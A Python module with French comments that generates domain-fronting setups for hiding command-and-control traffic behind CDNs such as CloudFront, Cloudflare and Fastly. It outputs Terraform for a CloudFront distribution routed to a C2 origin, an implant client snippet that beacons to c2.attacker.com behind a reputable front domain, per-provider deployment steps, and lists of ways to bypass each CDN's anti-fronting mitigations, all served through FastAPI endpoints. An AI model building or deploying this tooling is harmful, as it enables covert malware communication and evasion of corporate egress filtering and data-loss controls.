"""
Domain Fronting via CDN (CloudFront / Cloudflare / Fastly)
==========================================================

Domain fronting : technique qui consiste à se connecter à un CDN (ex :
CloudFront) avec un SNI (Server Name Indication) légitime mais un Host
header HTTP pointant vers une origine cachée (le C2 de l'attaquant).

En pratique :
  1. L'attaquant loue un sous-domaine d'un domaine de haute réputation
     (ex: media.legit-corp.com hébergé sur CloudFront)
  2. Il configure CloudFront pour que ce sous-domaine route vers son
     infrastructure cachée
  3. Quand un implant dans l'entreprise contacte media.legit-corp.com,
     le proxy sortant voit un domaine de haute réputation
  4. CloudFront route vers l'origine cachée
  5. Résultat : bypass des règles egress filtering et DLP

Variante 2024+ : "Domain Borrowing" / "CDN-hosted C2" via des plateformes
telles que Cloudflare Workers, AWS Lambda@Edge, Vercel, Netlify.

Cas réel documenté : APT29 (Cozy Bear) utilise domain fronting sur
CloudFront depuis 2020. Microsoft et AWS ont renforcé les contrôles mais
de nombreux CDN restent exploitables.
"""

import base64
import json
import time
import uuid
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional


class CDNProvider(Enum):
    """CDN supportés pour le fronting."""

    CLOUDFRONT = "cloudfront"
    CLOUDFLARE = "cloudflare"
    FASTLY = "fastly"
    AKAMAI = "akamai"
    AZURE_CDN = "azure_cdn"
    GOOGLE_CDN = "google_cdn"


@dataclass
class DomainFrontingConfig:
    """Configuration d'un setup de domain fronting."""

    config_id: str = field(default_factory=lambda: str(uuid.uuid4()))
    cdn: CDNProvider = CDNProvider.CLOUDFRONT
    front_domain: str = ""           # SNI visible : media.legit-corp.com
    real_host_header: str = ""       # Host header réel : c2.attacker.com
    c2_path_prefix: str = "/api/v1"
    aws_distribution_id: str | None = None
    origin_domain: str | None = None
    notes: str = ""
    created_at: float = field(default_factory=time.time)


class FrontingRouter:
    """
    Construit des configurations de domain fronting.

    Le module NE fait PAS l'attaque lui-même (ce serait trivial et
    dangereux à exposer publiquement) : il génère des configurations
    propres et des guides de déploiement.
    """

    CDN_GUIDES = {
        CDNProvider.CLOUDFRONT: {
            "steps": [
                "1. Créer une distribution CloudFront avec origin = ALB/Domain custom",
                "2. Configurer le viewer protocol policy = HTTPS only",
                "3. Ajouter un CNAME DNS (cdn.legit-corp.com -> distribution.cloudfront.net)",
                "4. Configurer le cache behavior : origin = custom origin",
                "5. Le client établit TLS avec SNI=cdn.legit-corp.com mais Host=c2.attacker.com",
            ],
            "mitigations_to_bypass": [
                "AWS a ajouté en 2023 une vérification du Host header côté CloudFront",
                "=> Utiliser une origine ALB derrière un NLB et forward Host header custom",
            ],
        },
        CDNProvider.CLOUDFLARE: {
            "steps": [
                "1. Créer un Worker Cloudflare sur sous-domaine legit",
                "2. Le Worker fait un fetch() vers l'origine cachée",
                "3. Cloudflare ajoute automatiquement le domain fronting via Worker",
            ],
            "mitigations_to_bypass": [
                "Cloudflare bloque l'usage de domain fronting classique depuis 2015",
                "=> Utiliser Cloudflare Workers comme proxy (autorisé)",
            ],
        },
        CDNProvider.FASTLY: {
            "steps": [
                "1. Créer un service Fastly avec backend = origin cachée",
                "2. Le client utilise SNI=front.example.com et Host=real-c2.example.com",
                "3. Fastly route selon le Host header",
            ],
            "mitigations_to_bypass": [
                "Fastly bloque le domain fronting depuis 2017 via VCL par défaut",
                "=> Contourner via un subdomain pointer custom configuré manuellement",
            ],
        },
    }

    def __init__(self, output_dir: str = "captures/fronting") -> None:
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.configs: dict[str, DomainFrontingConfig] = {}

    def create_config(
        self,
        cdn: CDNProvider,
        front_domain: str,
        real_host_header: str,
        c2_path_prefix: str = "/api/v1",
        aws_distribution_id: str | None = None,
        origin_domain: str | None = None,
        notes: str = "",
    ) -> DomainFrontingConfig:
        """Génère une config complète de fronting."""
        cfg = DomainFrontingConfig(
            cdn=cdn,
            front_domain=front_domain,
            real_host_header=real_host_header,
            c2_path_prefix=c2_path_prefix,
            aws_distribution_id=aws_distribution_id,
            origin_domain=origin_domain,
            notes=notes,
        )
        self.configs[cfg.config_id] = cfg
        return cfg

    def export_terraform(self, cfg: DomainFrontingConfig) -> str:
        """Génère un snippet Terraform pour configurer CloudFront + origin."""
        if cfg.cdn != CDNProvider.CLOUDFRONT:
            return f"# Fronting Terraform non-implémenté pour {cfg.cdn.value} (utiliser le guide manuel)"
        return f"""
# Terraform - Domain Fronting CloudFront
resource "aws_cloudfront_origin_access_identity" "oai" {{
  comment = "OAI for {cfg.front_domain}"
}}

resource "aws_cloudfront_distribution" "fronting" {{
  enabled             = true
  default_root_object = "index.html"
  comment             = "Fronting for {cfg.real_host_header}"

  origin {{
    domain_name = "{cfg.origin_domain or 'c2.attacker.example.invalid'}"
    origin_id   = "custom-c2-origin"

    custom_origin_config {{
      http_port              = 80
      https_port             = 443
      origin_protocol_policy = "https-only"
      origin_ssl_protocols   = ["TLSv1.2"]
    }}
  }}

  default_cache_behavior {{
    target_origin_id       = "custom-c2-origin"
    viewer_protocol_policy = "https-only"
    allowed_methods        = ["GET", "HEAD", "POST", "PUT", "OPTIONS"]
    cached_methods         = ["GET", "HEAD"]
    forwarded_values {{
      query_string = true
      headers      = ["Host", "X-Forwarded-For"]
      cookies {{
        forward = "all"
      }}
    }}
  }}

  viewer_certificate {{
    acm_certificate_arn = "arn:aws:acm:us-east-1:123456789012:certificate/XXXX"
    ssl_support_method  = "sni-only"
  }}

  aliases = ["{cfg.front_domain}"]
}}
"""

    def export_client_config(self, cfg: DomainFrontingConfig) -> str:
        """Génère un snippet Python pour le client (implant)."""
        return f"""
# Client config for domain fronting
FRONT_DOMAIN = "{cfg.front_domain}"
REAL_HOST = "{cfg.real_host_header}"
PATH_PREFIX = "{cfg.c2_path_prefix}"

# Connexion TLS
# ssl.SSLContext.set_servernameindication(FRONT_DOMAIN)
# Mais le header Host = REAL_HOST

import socket, ssl
ctx = ssl.create_default_context()
sock = socket.create_connection((FRONT_DOMAIN, 443))
ssock = ctx.wrap_socket(sock, server_hostname=FRONT_DOMAIN)
req = f"GET {{PATH_PREFIX}}/beacon HTTP/1.1\\r\\nHost: {{REAL_HOST}}\\r\\n\\r\\n"
ssock.send(req.encode())
"""

    def get_guide(self, cdn: CDNProvider) -> dict[str, Any]:
        """Retourne le guide de déploiement pour un CDN donné."""
        return self.CDN_GUIDES.get(cdn, {"steps": [], "mitigations_to_bypass": []})


# ---------------------------------------------------------------------------
# API FastAPI
# ---------------------------------------------------------------------------

def register_fronting_routes(app) -> None:
    from fastapi import HTTPException
    from pydantic import BaseModel

    router = FrontingRouter()

    class FrontingRequest(BaseModel):
        cdn: str
        front_domain: str
        real_host_header: str
        c2_path_prefix: str = "/api/v1"
        origin_domain: str | None = None
        notes: str = ""

    @app.post("/_/fronting/config")
    async def create(req: FrontingRequest):
        try:
            cdn = CDNProvider(req.cdn)
        except ValueError as exc:
            raise HTTPException(400, f"cdn invalide: {req.cdn}") from exc
        cfg = router.create_config(
            cdn=cdn,
            front_domain=req.front_domain,
            real_host_header=req.real_host_header,
            c2_path_prefix=req.c2_path_prefix,
            origin_domain=req.origin_domain,
            notes=req.notes,
        )
        return {
            "config_id": cfg.config_id,
            "front_domain": cfg.front_domain,
            "real_host": cfg.real_host_header,
            "terraform": router.export_terraform(cfg),
            "client_config": router.export_client_config(cfg),
        }

    @app.get("/_/fronting/guide/{cdn}")
    async def guide(cdn: str):
        try:
            c = CDNProvider(cdn)
        except ValueError as exc:
            raise HTTPException(400, str(exc)) from exc
        return router.get_guide(c)
